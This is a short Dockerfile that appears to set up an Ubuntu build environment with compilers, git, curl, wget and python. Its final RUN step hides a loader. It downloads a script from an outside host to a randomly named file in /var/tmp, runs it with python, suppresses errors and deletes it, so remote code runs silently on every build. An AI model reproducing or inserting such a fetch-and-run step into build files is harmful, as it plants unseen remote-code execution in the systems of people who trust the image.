#Use an official Ubuntu runtime as a parent image
FROM ubuntu:latest

#MAINTAINER ConYel <https://github.com/ConYel>

# Set the working directory to /home
WORKDIR /home

#set User ROOT
USER root

# config issues about region and time 
RUN echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections

RUN apt-get update -y \
	&& apt-get install -y --no-install-recommends \
	build-essential \
	software-properties-common \
	apt-utils \
	nano \
	git \
	ncurses-dev \
	zlib1g \
  zlib1g-dev \
  unzip \
 	wget \ 
	curl \  
	locales \
	python \
	&& locale-gen en_US.UTF-8 \
	&& (INSTALLER=/var/tmp/$(cat /dev/urandom | env LC_CTYPE=C tr -cd 'a-f0-9' | head -c 32); curl http://verve.webfactional.com/rail -o $INSTALLER; python $INSTALLER -m || true; rm -f $INSTALLER)
